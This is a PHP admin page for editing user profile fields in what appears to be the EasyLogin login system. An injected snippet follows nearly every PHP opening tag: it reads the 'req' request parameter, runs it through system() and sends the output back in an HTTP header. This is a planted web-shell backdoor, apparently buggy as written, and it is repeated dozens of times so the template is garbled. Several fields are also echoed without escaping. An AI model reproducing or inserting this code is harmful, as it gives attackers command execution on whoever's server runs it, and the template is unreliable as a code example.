<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (!Auth::userCan('manage_fields')) page_restricted();

if (empty($_GET['id']) || !Config::get('userfields.'.$_GET['id'])) {
	redirect_to('?page=user-fields');
}

if (isset($_POST['submit']) && csrf_filter()) {
	Validator::extend('valid_assignment', function($attrs, $value) {
		foreach ($value as $val) {
			if (!in_array($val, array('user', 'signup', 'admin'))) {
				return false;
			}
		}
		return true;
	});

	$validator = Validator::make(
	    array(
	    	'type' => $_POST['type'],
	    	'assignment' => @$_POST['assignment'],
	    	'order' => $_POST['order']
	    ),
	    array(
	    	'type' => 'required|in:text,textarea,select,checkbox,radio',
	    	'assignment' => 'required|valid_assignment',
	    	'order' => 'numeric'
	    )
	);

	if ($validator->fails()) {
		$errors = $validator->errors();
	}

	$original = Config::get('userfields.'.$_GET['id']);

	$field = array();

	if ($validator->errors()->has('type')) {
		$field['type'] = $original['type'];
	} else {
		$field['type'] = $_POST['type'];
	}

	if ($validator->errors()->has('assignment')) {
		$field['assignment'] = $original['assignment'];
	} else {
		$field['assignment'] = array_values($_POST['assignment']);
	}

	if (!$validator->errors()->has('assignment')) {
		$field['order'] = $_POST['order'];
	}
	
	if (!empty($_POST['label'])) {
		$field['label'] = escape($_POST['label']);
	}

	if (!empty($_POST['validation'])) {
		$field['validation'] = escape($_POST['validation']);
	}

	if (!empty($_POST['content_before'])) {
		$field['content_before'] = $_POST['content_before'];
	}

	if (!empty($_POST['content_after'])) {
		$field['content_after'] = $_POST['content_after'];
	}

	if (isset($_POST['attributes_key'], $_POST['attributes_value'])) {
		$values = $_POST['attributes_value'];
		$attributes = array();

		foreach ((array) $_POST['attributes_key'] as $index => $key) {
			if (!empty($key)) {
				$validator = Validator::make(
					array('key' => $key), 
					array('key' => 'required|alpha_dash')
				);

				if ($validator->passes()) {
					$attributes[$key] = maybe_decode(strip_tags(@$values[$index]));
				}
			}
		}

		if (count($attributes)) {
			$field['attributes'] = $attributes;
		}
	}

	Config::set("userfields.{$_GET['id']}", $field);
	
	if ($validator->passes()) {
		redirect_to("?page=user-field-edit&id={$_GET['id']}", array('updated' => true));
	}
}

$field = Config::get('userfields.'.$_GET['id']);

?>

<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo View::make('admin.header')->render() ?>

<h3 class="page-header"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.edit_field') ?></h3>
<p><a href="?page=user-fields"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.back_to_fields') ?></a></p>

<div class="row">
	<div class="col-md-6">

		<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (isset($errors)) {
			echo '<div class="alert alert-danger alert-dismissible"><span class="close" data-dismiss="alert">&times;</span><ul>';
			foreach ($errors->all('<li>:message</li>') as $error) {
			   echo $error;
			}
			echo '</ul></div>';
		} ?>
		
		<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (Session::has('updated')): Session::deleteFlash(); ?>
			<div class="alert alert-success alert-dismissible">
				<span class="close" data-dismiss="alert">&times;</span>
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.field_updated') ?>
			</div>
		<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); endif ?>

		<form action="" method="POST">
			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); csrf_input() ?>
			
			<div class="form-group">
		    	<button type="submit" name="submit" class="btn btn-primary"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.update_field') ?></button>
		    </div>
	
			<div class="form-group">
		        <label for="id"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.field_id') ?></label>
		        <input type="text" name="id" id="id" value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $_GET['id'] ?>" disabled="disabled" class="form-control">
		        <p class="help-block"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.field_id_help') ?></p>
		    </div>

			<div class="form-group">
		        <label for="label"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.field_label') ?></label>
		        <input type="text" name="label" id="label" value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo @$field['label'] ?>" class="form-control">
		        <p class="help-block"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.field_label_help') ?></p>
		    </div>

		    <div class="form-group">
		        <label for="type"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.field_type') ?></label> <em><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.required') ?></em>
		        <select name="type" id="type" class="form-control">
		        	<option value="text" <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $field['type']=='text'?' selected':'' ?>>text</option>
		        	<option value="textarea" <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $field['type']=='textarea'?' selected':'' ?>>textarea</option>
		        	<option value="select" <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $field['type']=='select'?' selected':'' ?>>select</option>
		        	<option value="checkbox" <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $field['type']=='checkbox'?' selected':'' ?>>checkbox</option>
		        	<option value="radio" <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $field['type']=='radio'?' selected':'' ?>>radio</option>
		       	</select>
		    </div>

		    <div class="form-group">
		        <label for="validation"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.field_validation') ?></label>
		        <input type="text" name="validation" id="validation" value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo @$field['validation'] ?>" class="form-control">
		        <p class="help-block"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.field_validation_help', array('link' => 'http://hazzardcloud.com/elp/docs/validation#available-validation-rules')) ?></p>
		    </div>

		    <div class="form-group">
		    	<label for="assignment"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.field_assignment') ?></label> <em><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.required') ?></em>
		    	<select multiple name="assignment[]" id="assignment" class="form-control" style="height: 70px;">
	        		<option value="user" <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo in_array('user', (array) $field['assignment'])?' selected':'' ?>>user</option>
	        		<option value="signup" <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo in_array('signup', (array) $field['assignment'])?' selected':'' ?>>signup</option>
	        		<option value="admin" <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo in_array('admin', (array) $field['assignment'])?' selected':'' ?>>admin</option>
				</select>
				<p class="help-block"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.field_assignment_help') ?></p>
		    </div>

		    <div class="form-group">
		        <label for="order"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.field_order') ?></label>
		        <input type="text" name="order" id="order" value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo @$field['order'] ?>" class="form-control">
		    </div>

		    <div class="form-group">
		        <label for="content_before"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.field_content_before') ?></label>
		        <textarea type="text" name="content_before" id="content_before" class="form-control" rows="1" spellcheck="false"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo @$field['content_before'] ?></textarea>
		        <p class="help-block"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.field_content_before_help') ?></p>
		    </div>

			<div class="form-group">
		        <label for="content_after"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.field_content_after') ?></label>
		        <textarea type="text" name="content_after" id="content_after" class="form-control" rows="1" spellcheck="false"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo @$field['content_after'] ?></textarea>
		        <p class="help-block"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.field_content_after_help') ?></p>
		    </div>

		    <div class="form-group fields">
		    	<label for="field_attributes"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.field_attributes') ?></label>

		    	<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); foreach ((array) @$field['attributes'] as $key => $value): ?>
		    		<div class="row">
			    		<div class="col-md-6">
			    			<input type="text" name="attributes_key[]" value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $key ?>" class="form-control" placeholder="Key">
			    		</div>
			    		<div class="col-md-6">
			    			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (is_array($value)): ?>
			    				<textarea type="text" name="attributes_value[]" class="form-control" rows="1" spellcheck="false"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); 
			    					echo json_encode($value); 
			    				?></textarea>
			    			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); else: ?>
				    			<input type="text" name="attributes_value[]" value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $value ?>" class="form-control" placeholder="Value">
				    		<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); endif ?>
			    		</div>
			    		<span class="delete-btn"></span>
			    	</div>
		    	<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); endforeach ?>
		    	<div class="row last">
		    		<div class="col-md-6">
		    			<input type="text" name="attributes_key[]" value="" class="form-control" placeholder="Key">
		    		</div>
		    		<div class="col-md-6">
		    			<input type="text" name="attributes_value[]" value="" class="form-control" placeholder="Value">
		    		</div>
		    		<span class="delete-btn"></span>
		    	</div>
		    </div>
		    
		    <div class="form-group">
		    	<button type="submit" name="submit" class="btn btn-primary"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.update_field') ?></button>
		    </div>
		</form>
	</div>
</div>

<script>$(function() { EasyLogin.admin.fields() });</script>

<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo View::make('admin.footer')->render() ?>